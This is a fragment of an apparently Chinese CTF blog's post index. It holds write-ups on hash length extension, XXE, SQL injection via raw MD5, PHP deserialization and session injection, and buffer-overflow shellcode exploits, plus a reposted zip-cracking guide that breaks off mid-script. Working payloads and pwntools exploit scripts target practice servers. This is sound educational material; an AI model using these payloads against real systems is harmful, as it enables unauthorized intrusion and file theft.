ELF('./passcode')cn = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222).process(\"./passcode\")cn.recv()cn.sendline('a'*96 + p32(bin.got['fflush']))cn.recv()cn.sendline(str(0x080485E3))print cn.recv() 再记录两条命令： 12objdump -d passcodereadelf -r passcode Sorry mom.. I got confused about scanf usage :(","tags":[{"name":"CTF","slug":"CTF","permalink":"https://cyris.pen.moe/tags/CTF/"},{"name":"PWN","slug":"PWN","permalink":"https://cyris.pen.moe/tags/PWN/"}]},{"title":"哈希长度扩展攻击","date":"2018-02-02T09:00:58.000Z","path":"posts/hash-extender-attack/","text":"哈希长度扩展攻击利用了 MD5 ，SHA1 等加密算法的缺陷，可以在不知道原始密钥的情况下计算出一个对应的 hash 值。 0x00 引言做题的时候看到了这个问题，挺好玩的，记录一下。 题目中的代码： 12345678910111213141516171819202122232425&lt;?php $auth = false; $role = \"guest\"; $salt = ; if (isset($_COOKIE[\"role\"])) &#123; $role = unserialize($_COOKIE[\"role\"]); $hsh = $_COOKIE[\"hsh\"]; if ($role===\"admin\" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[\"role\"]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; else &#123;&#125; $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); &#125; if ($auth) &#123; echo \"&lt;h3&gt;Welcome Admin. Your flag is \" &#125; else &#123; echo \"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;\"; &#125;?&gt; 一篇不错的文章：https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks 0x01 简单了解hash函数哈希函数以区块为单位操作数据。诸如MD5, SHA1, SHA256的区块长度都是512 bits 。大多数 message 的长度不会刚好可以被哈希函数的区块长度整除。因此 message 就必须被填充（ padding ）至区块长度的整数倍。 这里简单说一下MD5的加密原理，详细的描述可以参考 RFC1321 MD5是输入不定长度信息，输出固定长度128-bits的算法。即使原文中出现一个微小的变化，其散列结果也会发生巨大变化。空文的散列为：1MD5(\"\") = d41d8cd98f00b204e9800998ecf8427e MD5算法包括几个步骤：1. 补位；2. 补长度；3. 初始化MD缓冲区；4. 处理字块消息。它以512bit为一个块进行迭代运算，第一个块计算完成后四个寄存器的值就会更新，如果还存在下一个块，就在此基础上继续进行迭代计算，全部完成后，把四个寄存器中的十六进制连接起来，就是最后的md5值。简单讲一下这几个步骤： 1 - 补位如果当前的数据长度不满足对 512bit 求余为 448bit ，即len(message) % 512 != 448时，需要补位至满足这个条件。补位方式： 首先补一个1（二进制位上的1，而非十进制位上的） 在后面补0（也是二进制位上的），直到满足条件（数据比特长度对 512 求余为 448） 注意，如果消息长度已经达到 448bit ，也要进行补位，补位是必须的。 2 - 补长度即补 64bit 的长度，这个长度是在补 1 和 0 以前的长度，如果长度超出了 64bit，那么就取低 64bit。 引用一下lightless文章里的说法。完成补位与补长度的操作后，一个块可能是这个样子的：1raw_data + '\\x80' + '\\x00'*n + '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' 第一个 raw_data 的部分就是原始的数据，第二个部分’\\x80’是一开始补的一个二进制位 1，接着补若干个 \\ x00，直到整个长度达到 56Byte，最后的 8Byte 就是 raw_data 的长度，如果 raw_data 的长度超过了 2^64bit，则取低 64bit. 附1，2步的文档介绍 Step 1. Append Padding Bits The message is “padded” (extended) so that its length (in bits) is congruent to 448, modulo 512. That is, the message is extended so that it is just 64 bits shy of being a multiple of 512 bits long. Padding is always performed, even if the length of the message is already congruent to 448, modulo 512. Padding is performed as follows: a single “1” bit is appended to the message, and then “0” bits are appended so that the length in bits of the padded message becomes congruent to 448, modulo 512. In all, at least one bit and at most 512 bits are appended. Step 2. Append Length A 64-bit representation of b (the length of the message before the padding bits were added) is appended to the result of the previous step. In the unlikely event that b is greater than 2^64, then only the low-order 64 bits of b are used. (These bits are appended as two 32-bit words and appended low-order word first in accordance with the previous conventions.) At this point the resulting message (after padding with bits and with b) has a length that is an exact multiple of 512 bits. Equivalently, this message has a length that is an exact multiple of 16 (32-bit) words. Let M[0 … N-1] denote the words of the resulting message, where N is a multiple of 16. 3 - 初始化MD缓冲区在计算md5的时候会先初始化四个寄存器（A，B，C，D）且有各自的初始值：1234word A: 01 23 45 67word B: 89 ab cd efword C: fe dc ba 98word D: 76 54 32 10 4 - 处理字块消息必须用已经完成补位 &amp; 补长度操作的字块来进行运算，具体细节不展开了，我们只需要知道经过一次消息摘要后，上面的寄存器值将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。 举个栗子🌰 假设待加密的字符串为 abc 把字符串转化为16进制形式 - 616263 补位。即在二进制形式的信息后面先添一个 1 ，然后接若干个 0 直到满足 len(message) % 512 == 448 这一条件。16进制下我们在 616263 后加一个 80 （即二进制的 10000000 ），把它按照规则补位到 448 bit ，也就是56字节。 补长度。完成补位后，第 57 个字节存储的是补位之前信息的长度。原来的信息为 abc ，3个字符，3个字节，24 bit，换成16进制后为 0x18 ，其后补充7个 0x00 以补满 64 字节。 利用完成前几步补足操作的数据进行复杂运算。取出 64 字节信息，第一轮运算中使用的链变量为初始链变量，之后每一次运算链变量都会被覆盖更新，最后一轮运算产生的链变量经过高低位互换后就是我们得到的 MD5 值。 0x02 哈希长度扩展攻击MD5的补位操作正是实现长度扩展攻击的关键。 我们虽然不知道具体的 salt 值，但如果我们得到了其 hash 值以及一个可控的信息，我们就可以利用这些点进行哈希长度扩展攻击。我们得到的 hash 值正是最后一轮运算产生的链变量经过高低位互换后得到的结果，如果我们要把可控的信息进行下一轮运算，只需要知道上一轮信息产生的链变量。 回到开头贴的那份代码，关键语句为 123if ($role===\"admin\" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[\"role\"]))) &#123; $auth = true; &#125; 简单说一下思路：我们可以从 cookie 里拿到一段已知的 hash ，我们也知道需要校验的内容（ admin ），salt 与其长度是未知的，但我们可以通过哈希长度扩展攻击来构造一段想利用的校验内容，即使不知道 salt 也可以得出它的 hash 值。 先将明文进行分组与填充，在其后添加我们想要增加的新内容，即新的校验内容，然后我们把原来得到的 hash 值逆为 key 值（注意 md5 中的值都是小端的），根据 MD5 加密原理，我们已经得到了 key ，就可以得出下一轮的 hash 值了（例如此处的 admin 的 hash 值。） 因为这个题里还有一个 strrev 函数（字符串反转），构造如下 payload： 1234原校验的内容：;\"tseug\":5:s新添加的内容：;\"nimda\":5:s原hash值：3a4727d57463f122833d9e732f94e4e0salt 长度未知，需要进行爆破 之前的 wp 里用的是 hash_extender 这个工具，这里使用的是 hashpump 。 把 \\x 都换成 % ，可以得到 12role = s%3a5%3a\"admin\"%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3a5%3a\"guest\"%3bhsh = fcdc3840332555511c4e4323f6decb07 最后修改一下Cookie得到flag。 修复方法：用 hash($SECRET, hash($message)) 的方式，这样用户就不可控 message 了，另外使用 HMAC 也是可以的。","tags":[{"name":"CRYPTO","slug":"CRYPTO","permalink":"https://cyris.pen.moe/tags/CRYPTO/"},{"name":"CTF","slug":"CTF","permalink":"https://cyris.pen.moe/tags/CTF/"}]},{"title":"Jarvis OJ Writeup","date":"2017-11-04T03:23:21.000Z","path":"posts/jarvisoj-wp/","text":"记录一些 Jarvis OJ 上的题。 平台地址：https://www.jarvisoj.com/ WebLogin需要密码才能获得flag哦。 题目入口：http://web.jarvisoj.com:32772/ 在 Headers 里找到一条hint： 1Hint:\"select * from `admin` where password='\".md5($pass,true).\"'\" 涉及到一个MD5加密后的注入问题。 关于这条md5语句我们先来看下php手册中的描述： Description string md5 ( string str [, bool raw_output] ) Calculates the MD5 hash of str using the RSA Data Security, Inc. MD5 Message-Digest Algorithm, and returns that hash. The hash is a 32-character hexadecimal number. If the optional raw_output is set to TRUE, then the md5 digest is instead returned in raw binary format with a length of 16. 注: The optional raw_output parameter was added in PHP 5.0.0 and defaults to FALSE 也就是说，如果md5后的hex转换成字符串后，若包含 &#39;or&#39;&lt;trash&gt; 这样的字符串，那整个sql语句就会变成： 1SELECT * FROM admin WHERE pass = ''or'&lt;trash&gt;' 就可以进行注入了。 网上找到一个字符串：ffifdyop md5以后：276f722736c95d99e921722cf9ed621c 再转换成字符串即为&#39;or&#39;&lt;trash&gt; 把上面这个字符串作为 password 传入即可。 api调用请设法获得目标机器/home/ctf/flag.txt中的flag值。 题目入口：http://web.jarvisoj.com:9882/ 直接能看到源码：1234567891011121314151617181920212223242526272829&lt;script&gt;function XHR() &#123; var xhr; try &#123;xhr = new XMLHttpRequest();&#125; catch(e) &#123; var IEXHRVers =[\"Msxml3.XMLHTTP\",\"Msxml2.XMLHTTP\",\"Microsoft.XMLHTTP\"]; for (var i=0,len=IEXHRVers.length;i&lt; len;i++) &#123; try &#123;xhr = new ActiveXObject(IEXHRVers[i]);&#125; catch(e) &#123;continue;&#125; &#125; &#125; return xhr; &#125;function send()&#123; evil_input = document.getElementById(\"evil-input\").value; var xhr = XHR(); xhr.open(\"post\",\"/api/v1.0/try\",true); xhr.onreadystatechange = function () &#123; if (xhr.readyState==4 &amp;&amp; xhr.status==201) &#123; data = JSON.parse(xhr.responseText); tip_area = document.getElementById(\"tip-area\"); tip_area.value = data.task.search+data.task.value; &#125; &#125;; xhr.setRequestHeader(\"Content-Type\",\"application/json\"); xhr.send('&#123;\"search\":\"'+evil_input+'\",\"value\":\"own\"&#125;');&#125;&lt;/script&gt; 光看这个没找到什么特别的东西，搜了一些资料发现这题是关于 XXE漏洞 ，简单地说就是利用 xml 中的 Entity 实体来读取文件或者执行系统命令等，以造成攻击。 这题里先把 Content-Type 改成 application/xml，然后构造： 1234567&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE xdsec [&lt;!ELEMENT methodname ANY &gt;&lt;!ENTITY xxe SYSTEM \"/home/ctf/flag.txt\" &gt;]&gt;&lt;methodcall&gt;&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;&lt;/methodcall&gt; 就可以获取flag了。 神盾局的秘密这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？ 题目入口：http://web.jarvisoj.com:32768/ 扫了一下目录，只发现了 showing.php 和 index.php。 查看源码发现 1&lt;img src=\"showimg.php?img=c2hpZWxkLmpwZw==\" width=\"100%\"&gt; 感觉像文件包含，但是现在除了这张图外没有别的能利用的东西，试着读取 showing.php 本身： 可以看到源码，过滤了 pctf 。但是没什么利用方式，如果直接查看 /pctf.php 拿到的是假flag。同样的方式读取 index.php： 123456789&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; 然后拿到 shield.php 的源码： 123456789101112131415161718&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; shield.php 中说flag在 pctf.php 里，但是在 showing.php 中被过滤了，所以直接读它拿到的是假flag。留意到 index.php 里用了反序列化，可以利用这点构造payload： 1234567891011&lt;?php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; &#125; $a = new Shield(); $a-&gt;file = \"pctf.php\"; echo serialize($a);?&gt; 序列化后的结果为： 1O:6:\"Shield\":1:&#123;s:4:\"file\";s:8:\"pctf.php\";&#125; 利用 index.php 中的 class 参数传入payload然后再反序列化就可以拿到flag了。 1http://web.jarvisoj.com:32768/?class=O:6:\"Shield\":1:&#123;s:4:\"file\";s:8:\"pctf.php\";&#125; 12345&lt;!--?php //Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125; //Fake flag: echo \"FLAG: PCTF&#123;I_4m_not_fl4g&#125;\"?--&gt; flag在管理员手里只有管理员才能获得flag，你能想办法获得吗？ 题目链接：http://web.jarvisoj.com:32778/ vim备份文件泄露（ /index.php~ ），恢复后拿到源码（题目有点问题，vim -r 一直失败，想强行手动恢复但是感觉没啥意义…就直接搜了原题的源码贴上来了） 1234567891011121314151617181920212223242526272829303132333435363738&lt;html&gt; &lt;head&gt; &lt;title&gt;Web 350&lt;/title&gt; &lt;style type=\"text/css\"&gt; body &#123; background:gray; text-align:center; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;?php $auth = false; $role = \"guest\"; $salt = ; if (isset($_COOKIE[\"role\"])) &#123; $role = unserialize($_COOKIE[\"role\"]); $hsh = $_COOKIE[\"hsh\"]; if ($role===\"admin\" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[\"role\"]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; else &#123;&#125; $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); &#125; if ($auth) &#123; echo \"&lt;h3&gt;Welcome Admin. Your flag is \" &#125; else &#123; echo \"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;\"; &#125; ?&gt; &lt;/body&gt; &lt;/html&gt; 核心语句为：1$role===\"admin\" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[\"role\"])) 查了些资料，发现可以使用 哈希长度扩展攻击 。 做题的时候整理了一下这里涉及的知识点 - 传送门 利用工具： HashPumphash_extender 已有条件：1234Cookie-hsh：3a4727d57463f122833d9e732f94e4e0Cookie-role：s%3A5%3A%22guest%22%3B需要求：md5(salt+strrev(admin))* salt长度未知 这里我用的是 hash_extender （需要make一下），因为 mac 最新的 openssl 库就是装不上….丢去服务器上跑了，salt 长度未知，贴一份脚本： 1234567891011121314151617181920212223242526272829303132333435363738from urlparse import urlparsefrom httplib import HTTPConnectionfrom urllib import urlencodeimport jsonimport timeimport osimport urllibdef gao(x, y): #print x #print y url = \"http://web.jarvisoj.com:32778/index.php\" cookie = \"role=\" + x + \"; hsh=\" + y #print cookie build_header = &#123; 'Cookie': cookie, 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0', 'Host': 'web.jarvisoj.com:32778', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', &#125; urlparts = urlparse(url) conn = HTTPConnection(urlparts.hostname, urlparts.port or 80) conn.request(\"GET\", urlparts.path, '', build_header) resp = conn.getresponse() body = resp.read() return bodyfor i in xrange(1000): print i # secret len = ??? find_hash = \"./hash_extender -d ';\\\"tseug\\\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5 -a ';\\\"nimda\\\":5:s' --out-data-format=html -l \" + str(i) + \" --quiet\" #print find_hash calc_res = os.popen(find_hash).readlines() hash_value = calc_res[0][:32] attack_padding = calc_res[0][32:] attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1]) ret = gao(attack_padding, hash_value) if \"Welcome\" in ret: print ret break 得到回显： 123456789101112131415161718...12&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 350&lt;/title&gt;&lt;style type=\"text/css\"&gt; body &#123; background:gray; text-align:center; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; &lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; 同时也可以知道 salt 的长度为12。 PHPINFO题目入口：http://web.jarvisoj.com:32784/ 上来就给出了源码： 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php'); //设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 注意到 session.serialize_handler ，先放一篇关于 PHP 反序列化的文章。 PHP 内置了多种处理器用于在存取 $_SESSION 数据时，对数据进行序列化和反序列化： 处理器 存储格式 php 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列化的值 php_binary 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列化的值 php_serialize (php&gt;=5.5.4) 经过 serialize() 函数反序列化的数组 漏洞产生在 php_serialize 和 php 的解析方式上。如果我们用 php_serialize 的方式构造序列化语句，然后通过 php 解析语句，会出现一些问题，因为在使用 php_serialize 构造语句时我们可以使用 ‘|’ 这个符号，但是在 php 进行解析时会将 ‘|’ 符号前的数据当作数组中的键，其后的数据当作值，这个时候我们就可以构造特殊的语句来进行利用了。 通过 phpinfo 页面可以获得的信息有： php 版本为 5.6.21 。 php.ini 中默认的 session.serialize_handler 为 php_serialize ，而 index.php 中确将它设置成了 php （这就导致了 session 反序列化的问题）。 session.upload_progress.enabled 的状态为 On 。 session.upload_progress.cleanup 为关闭状态（提高了漏洞利用成功率）。 要将数据注入到 session 中，一种情况是开发者本身将用户可控的数据传进了 session （比如 joomla 等）；另一方面则可通过 php 配置不当进行 session 控制，比如 session.upload_progress.enabled is on。当这个设置打开时，php 会记录上传文件的进度，在上传时会将其信息保存在 $_SESSION 中。 下面开始漏洞利用。 首先写一个提交表单备用： 12345&lt;form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"gogogo\" /&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt; 因为不知道 flag 藏在哪里，先试着获取当前目录下的文件列表。构造 payload ： 12345678&lt;?phpclass OowoO&#123; public $mdzz='print_r(scandir(dirname(__FILE__)));';&#125;$obj = new OowoO();echo serialize($obj);?&gt; 序列化结果为： 1O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";&#125; 为了防止引号被转义，在前面加个杠，再把它改为 session 的格式，即在 payload 开头位置加个 ‘|’ ，修改后的 payload 如下： 1|O:5:\\\"OowoO\\\":1:&#123;s:4:\\\"mdzz\\\";s:36:\\\"print_r(scandir(dirname(__FILE__)));\\\";&#125; Burp start ，利用刚刚写的提交表单随便传个东西上去，抓包，修改 filename 为 payload （开头的 ‘|’ 后面如果加了空格会导致 payload 失效，去掉就好了）： 接下来就很简单了，去读取 Here_1s_7he_fl4g_buT_You_Cannot_see.php 就好。首先查询 PHPINFO 中的 _SERVER[“SCRIPT_FILENAME”] 得到当前目录为 /opt/lampp/htdocs/ ，将原 ‘xxx’ 处改为: 1print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\")); 序列化及一些小处理后得到最终 payload ： 1|O:5:\\\"OowoO\\\":1:&#123;s:4:\\\"mdzz\\\";s:88:\\\"print_r(file_get_contents(\\\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\\"));\\\";&#125; 用同样的方式 POST 一下就好了。 CTF{4d96e37f4be998c50aa586de4ada354a} Pwn[XMAN]level0题目描述： nc pwn2.jarvisoj.com 9881 level0.b9ded3801d6dd36a97468e128b81a65d ida 载入，先是 main 函数： 1234567891011121314151617181920212223.text:00000000004005C6 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00000000004005C6 public main.text:00000000004005C6 main proc near ; DATA XREF: _start+1D↑o.text:00000000004005C6.text:00000000004005C6 var_10 = qword ptr -10h.text:00000000004005C6 var_4 = dword ptr -4.text:00000000004005C6.text:00000000004005C6 ; __unwind &#123;.text:00000000004005C6 push rbp.text:00000000004005C7 mov rbp, rsp.text:00000000004005CA sub rsp, 10h.text:00000000004005CE mov [rbp+var_4], edi.text:00000000004005D1 mov [rbp+var_10], rsi.text:00000000004005D5 mov edx, 0Dh ; n.text:00000000004005DA mov esi, offset aHelloWorld ; \"Hello, World\\n\".text:00000000004005DF mov edi, 1 ; fd.text:00000000004005E4 call _write.text:00000000004005E9 mov eax, 0.text:00000000004005EE call vulnerable_function.text:00000000004005F3 leave.text:00000000004005F4 retn.text:00000000004005F4 ; &#125; // starts at 4005C6.text:00000000004005F4 main endp vulnerable_function 函数： 123456789101112131415161718.text:00000000004005A6 public vulnerable_function.text:00000000004005A6 vulnerable_function proc near ; CODE XREF: main+28↓p.text:00000000004005A6.text:00000000004005A6 buf = byte ptr -80h.text:00000000004005A6.text:00000000004005A6 ; __unwind &#123;.text:00000000004005A6 push rbp.text:00000000004005A7 mov rbp, rsp.text:00000000004005AA add rsp, 0FFFFFFFFFFFFFF80h.text:00000000004005AE lea rax, [rbp+buf].text:00000000004005B2 mov edx, 200h ; nbytes.text:00000000004005B7 mov rsi, rax ; buf.text:00000000004005BA mov edi, 0 ; fd.text:00000000004005BF call _read.text:00000000004005C4 leave.text:00000000004005C5 retn.text:00000000004005C5 ; &#125; // starts at 4005A6.text:00000000004005C5 vulnerable_function endp 以及一个未曾被调用但是能够打开 shell 的 callsystem 函数： 1234567891011.text:0000000000400596 public callsystem.text:0000000000400596 callsystem proc near.text:0000000000400596 ; __unwind &#123;.text:0000000000400596 push rbp.text:0000000000400597 mov rbp, rsp.text:000000000040059A mov edi, offset command ; \"/bin/sh\".text:000000000040059F call _system.text:00000000004005A4 pop rbp.text:00000000004005A5 retn.text:00000000004005A5 ; &#125; // starts at 400596.text:00000000004005A5 callsystem endp 可以利用 vulnerable_function 中的 read 函数进行缓冲区溢出，进而跳转到 callsystem 函数以 get shell 。 ctrl + k 查看该函数的栈帧，buf 的首地址与栈返回地址的距离差为 (+0000000000000008) - (-0000000000000080) ，即 0x88 ，callsystem 函数的地址为 0x400596 ，接下来就可以写 poc 了： 12345678910from pwn import *sh = remote('pwn2.jarvisoj.com', 9881)padding = 'A' * 0x88add = p64(0x400596)payload = padding + addsh.send(payload)sh.interactive() cat flag： CTF{713ca3944e92180e0ef03171981dcd41} [XMAN]level1题目描述： nc pwn2.jarvisoj.com 9877 level1.80eacdcd51aca92af7749d96efad7fb5 checksec 一下发现什么保护都没有开，这次是一个 32 位的程序，ida 载入之： main 函数： 12345678910111213141516171819202122232425262728293031.text:080484B7 ; int __cdecl main(int argc, const char **argv, const char **envp).text:080484B7 public main.text:080484B7 main proc near ; DATA XREF: _start+17↑o.text:080484B7.text:080484B7 var_4 = dword ptr -4.text:080484B7 argc = dword ptr 8.text:080484B7 argv = dword ptr 0Ch.text:080484B7 envp = dword ptr 10h.text:080484B7.text:080484B7 ; __unwind &#123;.text:080484B7 lea ecx, [esp+4].text:080484BB and esp, 0FFFFFFF0h.text:080484BE push dword ptr [ecx-4].text:080484C1 push ebp.text:080484C2 mov ebp, esp.text:080484C4 push ecx.text:080484C5 sub esp, 4.text:080484C8 call vulnerable_function.text:080484CD sub esp, 4.text:080484D0 push 0Eh ; n.text:080484D2 push offset aHelloWorld ; \"Hello, World!\\n\".text:080484D7 push 1 ; fd.text:080484D9 call _write.text:080484DE add esp, 10h.text:080484E1 mov eax, 0.text:080484E6 mov ecx, [ebp+var_4].text:080484E9 leave.text:080484EA lea esp, [ecx-4].text:080484ED retn.text:080484ED ; &#125; // starts at 80484B7.text:080484ED main endp 在调用 vulnerable_function 函数之后 printf “Hello, World!\\n”。 看一下 vulnerable_function 函数： 123456789101112131415161718192021222324252627.text:0804847B public vulnerable_function.text:0804847B vulnerable_function proc near ; CODE XREF: main+11↓p.text:0804847B.text:0804847B buf = byte ptr -88h.text:0804847B.text:0804847B ; __unwind &#123;.text:0804847B push ebp.text:0804847C mov ebp, esp.text:0804847E sub esp, 88h.text:08048484 sub esp, 8.text:08048487 lea eax, [ebp+buf].text:0804848D push eax.text:0804848E push offset format ; \"What's this:%p?\\n\".text:08048493 call _printf.text:08048498 add esp, 10h.text:0804849B sub esp, 4.text:0804849E push 100h ; nbytes.text:080484A3 lea eax, [ebp+buf].text:080484A9 push eax ; buf.text:080484AA push 0 ; fd.text:080484AC call _read.text:080484B1 add esp, 10h.text:080484B4 nop.text:080484B5 leave.text:080484B6 retn.text:080484B6 ; &#125; // starts at 804847B.text:080484B6 vulnerable_function endp 这个函数首先打印出 buf 的首地址，然后从标准输入获取 100 字节写入 buf 中。buf 的长度为 0x04 - (-0x88) = 0x8c &lt; 0x100 ，又因为没有开启栈保护，会造成栈溢出。 这样大致的思路就有了。先截取 buf 的首地址，在其中写入拿 shell 的 shellcode ，再用 buf 地址覆盖 vulnerable_function 函数的返回地址使之执行 system(“/bin/sh”) 。不过我们不知道 system 的地址，此时可以用 pwntools 中的 asm() 函数。 asm() 函数可以接收一个字符串作为参数，得到汇编码的机器代码。 这里我们可以用 asm(shellcraft.sh()) 的方式得到目标地址，shellcraft.sh() 就是执行 /bin/sh 的 shellcode。 按照 shellcode + nope*n + ret_address 这个格式就可以拿到 shell 了。 poc: 1234567891011from pwn import *sh = remote('pwn2.jarvisoj.com', 9877)shellcode = asm(shellcraft.sh()) p_buf = int(sh.recvline()[14:-2], 16)#print (hex(p_buf))payload = shellcode + (0x8c-len(shellcode)) * '\\x90' + p32(p_buf)sh.sendline(payload)sh.interactive() cat flag: CTF{82c2aa534a9dede9c3a0045d0fec8617}","tags":[{"name":"CTF","slug":"CTF","permalink":"https://cyris.pen.moe/tags/CTF/"}]},{"title":"给你压缩包却不给你密码的人到底在想什么","date":"2017-10-19T06:58:50.000Z","path":"posts/rar-attack/","text":"纯转载。原帖戳这里：veritas501 - 给你压缩包却不给你密码的人到底在想什么 0x00 开始在这里，我建议大家装两个解压软件，一个随意（我用的7z），一个是winrar。 嫌右键菜单挤你就装虚拟机里呗。 因为这两个压缩软件压缩出来的zip总是有点不同，最明显的一点，就是在已知明文攻击（后面会说）的时候，两种软件压缩出来的压缩包在构造明文压缩包的时候不能互用。 0x01 注释拿到压缩包上来一定要看有没有注释，一定要看有没有注释，一定要看有没有注释，重要的话说三遍。 有的时候他真的是想送你分，把密码或是hint写在注释里，但你就是不去看他一眼。 用hex方式打开的打一般在末尾 中文注释的话这样可能会乱码。建议压缩软件打开 0x02 弱密码这个其实真的没什么好说的，上来应该先试一试的，因为也不用动脑子，直接放后台跑就行了。 首先先跑纯数字密码，1到9位直接跑一遍，也就1分钟左右的时间吧。 不对的话可以上字典，或是短密码穷举一下，直接丢后台就行，人脑可以再做其他的方向的分析。 另外，如果跑字典都跑不到的话，可以试试此次CTF的名字，或是这个题目的名字。 软件用archpr，网上直接下就行，这里就不分享了。 0x03 压缩包伪加密一个伪加密的压缩包冒充加密压缩包，你要知道压缩软件是如何识别一个压缩包是否被加密的。 软件主要是围绕frFlags和deFlags来判断的。 我们用winrar创建一个加密的压缩包，可以看到加密的压缩包的frFlags和deFlags都为9。 其中，deFlags是针对单个文件的，压缩包中的每个文件都有。 而未加密的都为0。 用7z创建一个加密的压缩包，frFlags和deFlags都为1。这里就不多放图了。 而未加密的依然都为0。 综上，大家应该已经知道怎么改标志位来构造伪加密以及如何搞定伪加密了。（这里添一句，mac OS可以直接打开伪加密的压缩包。） 0x04 已知明文攻击一种比较巧妙的攻击方法，首先你需要一个压缩包中已知的文件(文件大小大于12bytes)，比如readme.txt 12345├─enc.zip│ ├─flag.txt *│ └─readme.txt *│└─readme.txt 这样我们就可以构造明文zip 12├─plaintext.zip│ └─readme.txt 原理大概是压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件反推加密密钥，利用密钥来解密其他加密文件。 划重点：构造明文压缩包时要选用与加密压缩包相同的压缩软件，如果他用winrar压的，你用7z构造出的压缩包来做明文压缩包，软件是会报错的。 这样就是还原出密钥了，点OK后软件会叫你保存解密后的压缩包。 0x05 CRC碰撞CRC32碰撞用于非常小的文件（6字节以上基本就别试了），就是通过CRC来反推文件内容。 而且CRC32是很容易碰撞的，所以就6字节而言，同一个CRC32可能对应着十几个字符串（纯可视字符）。 当文件刚好是6字节时，使用下面的crc32.py脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307#!/usr/bin/env python# CRC32 tools by Victor#usage: python crc32.py reverse 0xffffffff（the crc）import argparseimport osimport syspermitted_characters = set( map(ord, 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890_')) # \\wtesting = Falseargs = Nonedef get_poly(): poly = parse_dword(args.poly) if args.msb: poly = reverseBits(poly) check32(poly) return polydef get_input(): if args.instr: return tuple(map(ord, args.instr)) with args.infile as f: # pragma: no cover return tuple(map(ord, f.read()))def out(msg): if not testing: # pragma: no cover args.outfile.write(msg) args.outfile.write(os.linesep)table = []table_reverse = []def init_tables(poly, reverse=True): global table, table_reverse table = [] # build CRC32 table for i in range(256): for j in range(8): if i &amp; 1: i &gt;&gt;= 1 i ^= poly else: i &gt;&gt;= 1 table.append(i) assert len(table) == 256, \"table is wrong size\" # build reverse 